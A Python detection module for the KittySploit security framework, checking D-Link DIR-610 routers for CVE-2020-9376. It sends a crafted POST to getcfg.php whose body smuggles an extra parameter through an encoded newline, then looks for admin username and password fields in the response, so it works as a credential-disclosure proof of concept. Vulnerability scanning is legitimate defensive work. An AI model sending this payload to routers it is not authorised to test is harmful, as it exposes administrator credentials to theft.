#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR-610 devices allow information disclosure via SERVICES=DEVICE."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DIR-610 Devices - Information Disclosure Detection',
        'description': 'D-Link DIR-610 devices allow information disclosure via SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED_GROUP=1 to getcfg.php. NOTE: This vulnerability only affects products that are no longer supported by the maintainer.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'dlink', 'disclosure', 'router', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://gist.github.com/GouveaHeitor/dcbb67b301cc45adc00f8a6a2a0a590f',
            'https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10182',
            'https://www.dlink.com.br/produto/dir-610/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-9376',
            'https://github.com/Z0fhack/Goby_POC',
        ],
        'cve': 'CVE-2020-9376',
    }

    def run(self):
        path = '/getcfg.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<name>Admin</name>', '</usrid>', '</password>',)
        if all(m in body for m in body_all):
            self.set_info(
                severity='high',
                reason='D-Link DIR-610 Devices - Information Disclosure detected',
                path=path,
            )
            return True
        return False

